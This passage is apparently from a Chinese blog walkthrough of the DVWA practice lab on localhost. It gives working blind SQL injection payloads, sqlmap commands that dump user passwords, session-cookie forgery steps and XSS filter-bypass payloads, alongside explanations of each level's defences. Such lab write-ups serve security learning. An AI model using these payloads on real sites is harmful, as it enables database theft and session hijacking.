<p>最后得到第一个表名为guestbook</p>
<p>获取第二个表表名，输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第二个表表名的第一个字符的ASCII码值为117，即u</p>
<p>最后得到第二个表表名为users</p>

        <h4 id="获取字段名-2"   >
          <a href="#获取字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-2" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量-1"   >
          <a href="#获取users表中字段的数量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-1" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=8,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明users表中的字段数量为8</p>

        <h5 id="获取每个字段的字段长度-1"   >
          <a href="#获取每个字段的字段长度-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-1" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=7,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个字段的长度为7</p>
<p>最终获得每个字段的字段长度为7，10，9，4，8，6，10，12</p>

        <h5 id="获取字段名-3"   >
          <a href="#获取字段名-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-3" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1))=117,sleep(5),1);#</span><br></pre></td></tr></table></div></figure>

<p>页面有延迟，说明第一个字段的第一个字符的ASCII码值为117，即u</p>
<p>继续尝试，得到字段名分别为user_id,first_name,last_name,user,password,avatar,last_login,failed_login</p>

        <h3 id="Sqlmap-1"   >
          <a href="#Sqlmap-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sqlmap-1" class="headerlink" title="Sqlmap"></a>Sqlmap</h3>
      <p>使用sqlmap进行注入</p>

        <h4 id="获得当前数据库名"   >
          <a href="#获得当前数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得当前数据库名" class="headerlink" title="获得当前数据库名"></a>获得当前数据库名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232157912.png" alt="image-20240523215729724"></p>

        <h4 id="获得表名"   >
          <a href="#获得表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表名" class="headerlink" title="获得表名"></a>获得表名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa --tables</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232208754.png" alt="image-20240523220802688"></p>

        <h4 id="获得表的字段名"   >
          <a href="#获得表的字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得表的字段名" class="headerlink" title="获得表的字段名"></a>获得表的字段名</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users --columns</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405232207992.png" alt="image-20240523220744925"></p>

        <h4 id="获取字段具体数据"   >
          <a href="#获取字段具体数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段具体数据" class="headerlink" title="获取字段具体数据"></a>获取字段具体数据</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=br1j226plrlouaqoj959c5nu7s; security=low&quot; -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241319693.png" alt="image-20240524131957645"></p>
<p>查看源代码，对输入没有任何限制</p>

        <h2 id="Medium-7"   >
          <a href="#Medium-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221337952.png" alt="image-20240522133710909"></p>
<p>和之前的注入一样，用HackBar用POST方式传入</p>

        <h3 id="布尔盲注-1"   >
          <a href="#布尔盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3>
      
        <h4 id="判断注入类型-3"   >
          <a href="#判断注入类型-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型-3" class="headerlink" title="判断注入类型"></a>判断注入类型</h4>
      <p>输入1，页面返回存在这个ID</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320595.png" alt="image-20240522132028528"></p>
<p>输入1’or ‘1’=’1，报错</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221320302.png" alt="image-20240522132059254"></p>
<p>输入1 or 1 = 1，返回存在ID，说明是数字型注入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221321139.png" alt="image-20240522132120100"></p>

        <h4 id="查看列数-3"   >
          <a href="#查看列数-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看列数-3" class="headerlink" title="查看列数"></a>查看列数</h4>
      <p>输入1 order by 1，从1一直试直到报错，即可获得字段数，直到3报错，所以列数为2</p>

        <h4 id="获取数据库名-2"   >
          <a href="#获取数据库名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h4>
      
        <h5 id="获取数据库名称长度-2"   >
          <a href="#获取数据库名称长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称长度-2" class="headerlink" title="获取数据库名称长度"></a>获取数据库名称长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and length(database())=4;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取数据库名称-2"   >
          <a href="#获取数据库名称-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名称-2" class="headerlink" title="获取数据库名称"></a>获取数据库名称</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&gt;65;#</span><br></pre></td></tr></table></div></figure>


        <h4 id="获取数据库表名-4"   >
          <a href="#获取数据库表名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库表名-4" class="headerlink" title="获取数据库表名"></a>获取数据库表名</h4>
      
        <h5 id="获取表的数量-2"   >
          <a href="#获取表的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表的数量-2" class="headerlink" title="获取表的数量"></a>获取表的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(table_name) from information_schema.tables where table_schema=database()) =2;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="分别获取两个表的表名长度-2"   >
          <a href="#分别获取两个表的表名长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名长度-2" class="headerlink" title="分别获取两个表的表名长度"></a>分别获取两个表的表名长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第二个表</span><br><span class="line">1 and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=5;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="分别获取两个表的表名-2"   >
          <a href="#分别获取两个表的表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#分别获取两个表的表名-2" class="headerlink" title="分别获取两个表的表名"></a>分别获取两个表的表名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第一个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;#</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//获取第二个表的第一个字符</span><br><span class="line">1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117;#</span><br></pre></td></tr></table></div></figure>

<p>最终获得表名依次为guestbook，users</p>

        <h4 id="获取字段名-4"   >
          <a href="#获取字段名-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-4" class="headerlink" title="获取字段名"></a>获取字段名</h4>
      
        <h5 id="获取users表中字段的数量-2"   >
          <a href="#获取users表中字段的数量-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取users表中字段的数量-2" class="headerlink" title="获取users表中字段的数量"></a>获取users表中字段的数量</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=8;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取每个字段的字段长度-2"   >
          <a href="#获取每个字段的字段长度-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取每个字段的字段长度-2" class="headerlink" title="获取每个字段的字段长度"></a>获取每个字段的字段长度</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段长度</span><br><span class="line">1 and length(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=7;#</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取字段名-5"   >
          <a href="#获取字段名-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段名-5" class="headerlink" title="获取字段名"></a>获取字段名</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//第一个字段第一个字符</span><br><span class="line">1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=0x7573657273 limit 0,1),1))=117;#</span><br></pre></td></tr></table></div></figure>


        <h3 id="时间盲注-1"   >
          <a href="#时间盲注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3>
      <p>同Low难度步骤</p>
<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221339914.png" alt="image-20240522133946866"></p>
<p>使用<code>mysqli_real_escape_string</code> 函数，通过对字符串中的特定字符进行转义处理，在特定字符前添加反斜线 <code>\</code> ，特定字符包括’、”、\、NUL 字符、\n、\r、\x1A(在 Windows 系统中，Control-Z (<code>\x1A</code>) 被解释为文件结束标记)</p>

        <h2 id="High-7"   >
          <a href="#High-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-7" class="headerlink" title="High"></a>High</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340011.png" alt="image-20240522134027966"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221340132.png" alt="image-20240522134042088"></p>
<p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221347858.png" alt="image-20240522134746813"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221348596.png" alt="image-20240522134800557"></p>
<p>利用cookie传递参数id</p>
<p>添加了LIMIT 1，以此控制只输出一个结果</p>
<p>当SQL查询结果为空时，会执行函数sleep()，防止基于时间的盲注</p>
<p>所以只能布尔盲注了，步骤同Low</p>

        <h2 id="Impossible-7"   >
          <a href="#Impossible-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看关键源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221351986.png" alt="image-20240522135112922"></p>
<p>和上面的一样，CSRF、检测 id 是否是数字、prepare 预编译语来防止 SQL 注入</p>

        <h6 id="SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html"   >
          <a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#SQL盲注：https-www-cnblogs-com-qiushuo-p-17485659-html" class="headerlink" title="SQL盲注：https://www.cnblogs.com/qiushuo/p/17485659.html"></a>SQL盲注：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/qiushuo/p/17485659.html" >https://www.cnblogs.com/qiushuo/p/17485659.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h1 id="九、薄弱的Session-ID"   >
          <a href="#九、薄弱的Session-ID" class="heading-link"><i class="fas fa-link"></i></a><a href="#九、薄弱的Session-ID" class="headerlink" title="九、薄弱的Session ID"></a>九、薄弱的Session ID</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221357695.png" alt="image-20240522135739640"></p>

        <h2 id="Low-8"   >
          <a href="#Low-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221358115.png" alt="image-20240522135814073"></p>
<p>首先检查会话变量 <code>$_SESSION[&#39;last_session_id&#39;]</code> 是否已设置，如果未设置，将其初始化为 0，然后，每次 POST 请求时，这个变量的值都会递增，容易被伪造</p>
<p>可以看到，点一下按钮dvwaSession的值就会+1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221402921.png" alt="image-20240522140226878"></p>
<p>可以利用一下，将原网页的cookie复制下来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221427296.png" alt="image-20240522142750240"></p>
<p>打开一个新网页访问</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://127.0.0.1:4280/vulnerabilities/weak_id/" >http://127.0.0.1:4280/vulnerabilities/weak_id/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>同时抓包，然后修改里面的cookie为原网页的值，发送之后看到已经登录进来了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221426548.png" alt="image-20240522142630479"></p>
<p>HackBar也行</p>

        <h2 id="Medium-8"   >
          <a href="#Medium-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221437399.png" alt="image-20240522143740355"></p>
<p>Cookie 的值基于当前的 Unix 时间戳，<code>time()</code> 函数返回当前的 Unix 时间戳，即从1970年1月1日 00:00:00到当前时间的秒数</p>
<p>所以修改cookie时将dvwaSeesion的值改成当前的时间戳即可</p>

        <h2 id="High-8"   >
          <a href="#High-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-8" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221443734.png" alt="image-20240522144304673"></p>
<p>使用 MD5 哈希函数将值转换为哈希字符串</p>
<p>设置 Cookie 的过期时间为当前时间之后的 3600 秒</p>
<p>指定 Cookie 有效的路径，只有在此路径及其子路径下的页面才能访问该 Cookie</p>
<p>设置 Cookie 的域名为当前请求的域名</p>
<p>抓包看看cookie，看到响应里的cookie已经发生了变化</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405241346928.png" alt="image-20240524134609867"></p>
<p>将响应里的cookie拿去md5解密，发现值为8，再响应一次解密值为9，由此可见cookie也是逐渐递增的，所以可以修改为md5加密数字后的值</p>

        <h2 id="Impossible-8"   >
          <a href="#Impossible-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221450403.png" alt="image-20240522145047357"></p>
<p>使用 <code>mt_rand()</code> 生成一个随机数，<code>time()</code> 获取当前的 Unix 时间戳，和字符串 <code>&quot;Impossible&quot;</code> 一起构成了一个唯一的字符串，再使用SHA-1哈希函数将这个字符串转换为哈希字符串</p>
<p>同样设置了有效时间为一小时和有效路径</p>
<p><code>true</code>：设置 <code>secure</code> 标志为 <code>true</code>，意味着此 Cookie 只能通过 HTTPS 协议发送，防止通过 HTTP 连接泄露 Cookie 信息</p>
<p><code>true</code>：设置 <code>httponly</code> 标志为 <code>true</code>，意味着此 Cookie 不能被 JavaScript 访问，这有助于防止XSS盗用 Cookie</p>

        <h1 id="十、XSS（DOM型）"   >
          <a href="#十、XSS（DOM型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、XSS（DOM型）" class="headerlink" title="十、XSS（DOM型）"></a>十、XSS（DOM型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221539191.png" alt="image-20240522153907139"></p>
<p>随意选择一个后可以看到URL上有参数传入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221541437.png" alt="image-20240522154125388"></p>

        <h2 id="Low-9"   >
          <a href="#Low-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2>
      <p>直接在URL上将default的值改为，出现弹窗</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542746.png" alt="image-20240522154222698"></p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221542951.png" alt="image-20240522154247909"></p>
<p>没有任何防护</p>

        <h2 id="Medium-9"   >
          <a href="#Medium-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221545935.png" alt="image-20240522154551887"></p>
<p>检查是否存在default键，并且不为空</p>
<p>使用 <code>stripos()</code> 函数查找 <code>default</code> 参数值中是否包含 <code>&lt;script</code> 子串，<code>stripos()</code> 是不区分大小写的字符串查找函数，如果找到匹配项则返回TRUE</p>
<p>如果发现 <code>default</code> 参数包含 <code>&lt;script</code>，则立即重定向用户到同一页面，但将 <code>default</code> 参数设置为 “English”。这样做可以阻断潜在的脚本注入尝试，避免执行恶意脚本</p>
<p>使用 <code>header()</code> 函数执行 HTTP 重定向。这里使用 <code>location</code> 头进行重定向，是常见的防止恶意输入影响网站行为的手段。</p>
<p>因此用别的标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p>但是页面没有出现弹窗</p>
<p>查看网页源代码发现语句只是被插入到了value值中，但是并没有插入到option标签的值中，那么输入通常会被当做纯文本处理，不会被浏览器执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221553997.png" alt="image-20240522155350953"></p>
<p>Low难度的代码插入后网页源代码是这样的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221604723.png" alt="image-20240522160431679"></p>
<p>尝试提前闭合option标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221617977.png" alt="image-20240522161732933"></p>
<p>再尝试闭合select标签</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/select&gt;&lt;img src=1 onerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></div></figure>

<p>成功出现弹窗</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221618875.png" alt="image-20240522161831835"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221558788.png" alt="image-20240522155848745"></p>

        <h2 id="High-9"   >
          <a href="#High-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-9" class="headerlink" title="High"></a>High</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221619724.png" alt="image-20240522161925673"></p>
<p>使用白名单模式，如果default值相匹配，则插入case字段的相应值，如果不匹配，则插入的是默认的值所以default的值必须包含这几个之一</p>

        <h3 id="用-amp-连接"   >
          <a href="#用-amp-连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#用-amp-连接" class="headerlink" title="用&amp;连接"></a>用&amp;连接</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623430.png" alt="image-20240522162307386"></p>

        <h3 id="用"   >
          <a href="#用" class="heading-link"><i class="fas fa-link"></i></a><a href="#用" class="headerlink" title="用#"></a>用#</h3>
      <p> URL 中 <code>#</code> 之后的信息不会发送到服务器，它只会在本地（客户端浏览器）中使用</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221627508.png" alt="image-20240522162745466"></p>

        <h2 id="Impossible-9"   >
          <a href="#Impossible-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221623645.png" alt="image-20240522162327607"></p>
<p>输入代码试试，页面没反应，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405221630166.png" alt="image-20240522163027127"></p>
<p>这里对输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签，就不存在XSS漏洞了</p>

        <h1 id="十一、XSS（反射型）"   >
          <a href="#十一、XSS（反射型）" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、XSS（反射型）" class="headerlink" title="十一、XSS（反射型）"></a>十一、XSS（反射型）</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211304691.png" alt="image-20240521130457646"></p>
<p>随便输入一串字符，可以看到界面有变化，URL中也传入了name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211305114.png" alt="image-20240521130534080"></p>

        <h2 id="Low-10"   >
          <a href="#Low-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2>
      <p>尝试构造脚本，将<script>alert(/xss/)</script>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211308619.png" alt="image-20240521130826579"></p>
<p>通过</p>
<p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211309067.png" alt="image-20240521130929038"></p>
<p>只要输入不为空就行</p>

        <h2 id="Medium-10"   >
          <a href="#Medium-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2>
      <p>查看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211311646.png" alt="image-20240521131114609"></p>
<p>只是过滤了<script></p>

        <h3 id="大小写绕过"   >
          <a href="#大小写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3>
      <p>将</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Script&gt;alert(/xss/)&lt;/Script&gt;</span><br></pre></td></tr></table></div></figure>

<p>传入name变量</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211317739.png" alt="image-20240521131732696"></p>

        <h3 id="双写绕过"   >
          <a href="#双写绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></div></figure>

<p>…</p>

        <h2 id="High-10"   >
          <a href="#High-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#High-10" class="headerlink" title="High"></a>High</h2>
      <p>源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211337925.png" alt="image-20240521133758892"></p>
<p>过滤任何形式的 <script>标签，即使这些字符被插入其他字符或以不同顺序排列也一样</p>
<p>那就不用这个标签，利用JavaScript事件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;/&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405211341785.png" alt="image-20240521134137746"></p>

        <h6 id="XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430"   >
          <a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="heading-link"><i class="fas fa-link"></i></a><a href="#XSS绕过姿势：https-blog-csdn-net-2301-81504583-article-details-134948430" class="headerlink" title="XSS绕过姿势：https://blog.csdn.net/2301_81504583/article/details/134948430"></a>XSS绕过姿势：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81504583/article/details/134948430" >https://blog.csdn.net/2301_81504583/article/details/134948430</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h2 id="Impossible-10"   >
          <a href="#Impossible-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2>
